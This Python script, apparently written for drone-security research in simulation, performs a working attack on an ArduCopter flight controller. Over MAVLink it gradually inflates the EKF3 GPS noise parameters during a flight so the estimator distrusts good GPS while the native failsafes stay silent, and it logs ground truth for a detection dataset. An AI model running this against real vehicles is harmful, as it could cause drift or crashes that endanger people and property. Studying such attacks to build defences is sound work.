#!/usr/bin/env python3
"""
Control-Aware Attack: EKF Measurement-Noise Trust Manipulation

Simulates a compromised Companion Computer gradually inflating the
EKF3's expected GPS position/velocity measurement noise parameters
(EK3_POSNE_M_NSE, EK3_VELNE_M_NSE) via legitimate PARAM_SET calls.

Every individual value written is a technically valid EKF tuning
parameter -- these exist so operators can characterise their GPS
module's real noise floor. The attack does not touch GPS itself,
spoof any message, or violate a hard parameter bound. Its effect is
purely to make the EKF trust good GPS data less than it should,
causing the position/velocity ESTIMATE to drift toward IMU-only
dead-reckoning -- a fundamentally different failure mode to the
Attack #1 PID-drift script (which degrades control execution, not
state estimation).

Because GPS itself keeps reporting healthy, high-quality fixes
throughout, ArduPilot's native GPS failsafe (sat count / HDOP /
glitch detection) is not expected to fire -- this is the "control-
aware" / native-failsafe-evading property under test.
"""

import time
import math
import random
import argparse
import csv
import os
import sys
from pymavlink import mavutil

CONNECTION_STRING = 'udp:127.0.0.1:14551'
ATTACK_LOG_DIR = '/mnt/hgfs/Dataset/AttackGroundTruth'

HOME_LAT = -35.363262
HOME_LON = 149.165237

# EKF3 GPS measurement-noise trust parameters (stock ArduCopter defaults).
# Larger value = EKF trusts that measurement LESS.
TARGET_PARAMS = {
    'EK3_POSNE_M_NSE': 0.5,   # metres
    'EK3_VELNE_M_NSE': 0.3,   # m/s
}


def flush_mavlink_buffer(mav):
    while mav.recv_match(blocking=False) is not None:
        pass


def wait_ack(mav, command_name):
    ack = mav.recv_match(type='COMMAND_ACK', blocking=True, timeout=5)
    if ack is None:
        print(f'No ACK for {command_name}')
        return False
    result_name = mavutil.mavlink.enums["MAV_RESULT"][ack.result].name
    print(f'{command_name}: {result_name}')
    return ack.result == mavutil.mavlink.MAV_RESULT_ACCEPTED


def set_mode(mav, mode_name):
    mode_id = mav.mode_mapping()[mode_name]
    mav.mav.set_mode_send(
        mav.target_system,
        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        mode_id)
    time.sleep(1)


def arm(mav):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_COMPONENT_ARM_DISARM,
        0, 1, 0, 0, 0, 0, 0, 0)
    return wait_ack(mav, 'ARM')


def takeoff(mav, alt):
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_TAKEOFF,
        0, 0, 0, 0, 0, 0, 0, alt)
    return wait_ack(mav, 'TAKEOFF')


def goto(mav, lat, lon, alt):
    mav.mav.set_position_target_global_int_send(
        0, mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
        0b0000111111111000,
        int(lat * 1e7), int(lon * 1e7), alt,
        0, 0, 0, 0, 0, 0, 0, 0)


def wait_until_altitude(mav, target_alt, tolerance=0.5, timeout=60):
    flush_mavlink_buffer(mav)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='GLOBAL_POSITION_INT', blocking=True, timeout=5)
        if msg and abs(msg.relative_alt / 1000.0 - target_alt) < tolerance:
            return True
    return False


def get_param(mav, param_id, default, timeout=5):
    flush_mavlink_buffer(mav)
    mav.mav.param_request_read_send(
        mav.target_system, mav.target_component,
        param_id.encode('utf-8'), -1)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='PARAM_VALUE', blocking=True, timeout=1)
        if msg and msg.param_id.strip('\x00') == param_id:
            return msg.param_value
    print(f'WARNING: could not read {param_id}, using default {default}')
    return default


def set_param(mav, param_id, value):
    mav.mav.param_set_send(
        mav.target_system, mav.target_component,
        param_id.encode('utf-8'), value,
        mavutil.mavlink.MAV_PARAM_TYPE_REAL32)


def reset_params_to_default(mav):
    """Restore stock EKF trust parameters -- called before AND after
    the attack, mirroring the Attack #1 script's proven pattern."""
    for p, default in TARGET_PARAMS.items():
        set_param(mav, p, default)
    time.sleep(1)
    print(f'Reset {list(TARGET_PARAMS.keys())} to stock defaults')


def land(mav):
    flush_mavlink_buffer(mav)
    mav.mav.command_long_send(
        mav.target_system, mav.target_component,
        mavutil.mavlink.MAV_CMD_NAV_LAND,
        0, 0, 0, 0, 0, 0, 0, 0)
    wait_ack(mav, 'LAND')


def wait_for_disarm(mav, timeout=90):
    flush_mavlink_buffer(mav)
    start = time.time()
    while time.time() - start < timeout:
        msg = mav.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
        if msg and not (msg.base_mode & mavutil.mavlink.MAV_MODE_FLAG_SAFETY_ARMED):
            return True
    return False


def get_distance_metres(lat1, lon1, lat2, lon2):
    R = 6378137.0
    d_lat = math.radians(lat2 - lat1)
    d_lon = math.radians(lon2 - lon1)
    a = (math.sin(d_lat / 2) ** 2 +
         math.cos(math.radians(lat1)) * math.cos(math.radians(lat2)) *
         math.sin(d_lon / 2) ** 2)
    c = 2 * math.atan2(math.sqrt(a), math.sqrt(1 - a))
    return R * c


def generate_waypoints(seed, n_points=3):
    """Identical generator to mission.py / attack_pid_drift.py, so a
    given seed produces the SAME flight path across all three
    conditions -- baseline, Attack #1, and Attack #2 are matched pairs."""
    rng = random.Random(seed)
    waypoints = []
    for _ in range(n_points):
        d_lat = rng.uniform(-0.0012, 0.0012)
        d_lon = rng.uniform(-0.0012, 0.0012)
        waypoints.append((HOME_LAT + d_lat, HOME_LON + d_lon))
    return waypoints


def monitor_tracking_error(mav, target_lat, target_lon, duration, gt_writer, gt_file):
    """Track live distance-to-target AND EKF variance fields over a
    fixed window, rather than blocking-until-arrival -- we want to
    directly observe lag/overshoot under degraded EKF trust, not just
    confirm eventual arrival."""
    flush_mavlink_buffer(mav)
    start = time.time()
    max_dist = 0.0
    max_pos_var = 0.0
    max_vel_var = 0.0
    while time.time() - start < duration:
        msg = mav.recv_match(
            type=['GLOBAL_POSITION_INT', 'EKF_STATUS_REPORT'],
            blocking=True, timeout=2)
        if msg is None:
            continue
        t = time.time()
        if msg.get_type() == 'GLOBAL_POSITION_INT':
            dist = get_distance_metres(
                msg.lat / 1e7, msg.lon / 1e7, target_lat, target_lon)
            max_dist = max(max_dist, dist)
            gt_writer.writerow([t, 'tracking_error_m', '', '', dist])
        elif msg.get_type() == 'EKF_STATUS_REPORT':
            max_pos_var = max(max_pos_var, msg.pos_horiz_variance)
            max_vel_var = max(max_vel_var, msg.velocity_variance)
            gt_writer.writerow([t, 'pos_horiz_variance', '', '', msg.pos_horiz_variance])
            gt_writer.writerow([t, 'velocity_variance', '', '', msg.velocity_variance])
    gt_file.flush()
    return max_dist, max_pos_var, max_vel_var


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--seed', type=int, default=0)
    parser.add_argument('--alt', type=float, default=None)
    parser.add_argument('--drift-steps', type=int, default=15)
    parser.add_argument('--drift-interval', type=float, default=4.0)
    parser.add_argument('--growth-factor', type=float, default=1.15,
                         help='Multiplicative noise-trust inflation per step '
                              '(1.15 = +15%% per step)')
    args = parser.parse_args()

    rng = random.Random(args.seed)
    takeoff_alt = args.alt if args.alt is not None else rng.uniform(8, 15)

    os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    gt_filename = f'{ATTACK_LOG_DIR}/attack_ekf_trust_seed{args.seed}_{timestamp}.csv'

    mav = mavutil.mavlink_connection(CONNECTION_STRING)
    mav.wait_heartbeat()
    print(f'Connected: system {mav.target_system}')

    reset_params_to_default(mav)
    originals = {p: get_param(mav, p, d) for p, d in TARGET_PARAMS.items()}
    print(f'Original EKF trust params: {originals}')

    set_mode(mav, 'GUIDED')
    if not arm(mav):
        print('ABORT: arm failed'); sys.exit(1)
    if not takeoff(mav, takeoff_alt):
        print('ABORT: takeoff failed'); sys.exit(1)
    if not wait_until_altitude(mav, takeoff_alt):
        print('ABORT: never reached altitude'); sys.exit(1)

    print(f'Reached {takeoff_alt:.1f}m -- holding briefly before attack begins')
    time.sleep(5)

    waypoints = generate_waypoints(args.seed, n_points=3)
    wp_trigger_steps = {
        0: waypoints[0],
        args.drift_steps // 3: waypoints[1],
        (2 * args.drift_steps) // 3: waypoints[2],
    }

    try:
        with open(gt_filename, 'w', newline='') as gt_file:
            gt_writer = csv.writer(gt_file)
            gt_writer.writerow(['t_wall', 'event', 'param', 'old_value', 'new_value'])
            gt_writer.writerow([time.time(), 'attack_start', '', '', ''])
            gt_file.flush()

            current = dict(originals)

            for step in range(args.drift_steps):
                if step in wp_trigger_steps:
                    lat, lon = wp_trigger_steps[step]
                    print(f'Commanding transit to waypoint ({lat:.6f}, {lon:.6f}) '
                          f'at step {step+1}')
                    goto(mav, lat, lon, takeoff_alt)

                for p in TARGET_PARAMS:
                    old_val = current[p]
                    new_val = old_val * args.growth_factor
                    set_param(mav, p, new_val)
                    gt_writer.writerow([time.time(), 'param_set', p, old_val, new_val])
                    current[p] = new_val
                gt_file.flush()
                print(f'Step {step+1}/{args.drift_steps}: {current}')
                time.sleep(args.drift_interval)

            gt_writer.writerow([time.time(), 'attack_end', '', '', ''])
            gt_file.flush()

            print('Commanding return transit to HOME under peak degraded EKF trust...')
            goto(mav, HOME_LAT, HOME_LON, takeoff_alt)

            print('Monitoring live tracking error + EKF variance (20s)...')
            max_dist, max_pos_var, max_vel_var = monitor_tracking_error(
                mav, HOME_LAT, HOME_LON, 20, gt_writer, gt_file)
            gt_writer.writerow([time.time(), 'observed_max_tracking_error_m', '', '', max_dist])
            gt_writer.writerow([time.time(), 'observed_max_pos_variance', '', '', max_pos_var])
            gt_writer.writerow([time.time(), 'observed_max_vel_variance', '', '', max_vel_var])
            print(f'Max tracking error: {max_dist:.2f}m | '
                  f'Max pos variance: {max_pos_var:.4f} | '
                  f'Max vel variance: {max_vel_var:.4f}')

        print('Attempting landing')
        land(mav)
        if wait_for_disarm(mav, timeout=120):
            print('Confirmed landed/disarmed.')
        else:
            print('WARNING: landing/disarm not confirmed -- vehicle may be unstable. '
                  'This may itself be a valid experimental outcome.')

    finally:
        reset_params_to_default(mav)

    print('Attack run complete.')
    print(f'Ground truth saved to {gt_filename}')


if __name__ == '__main__':
    main()
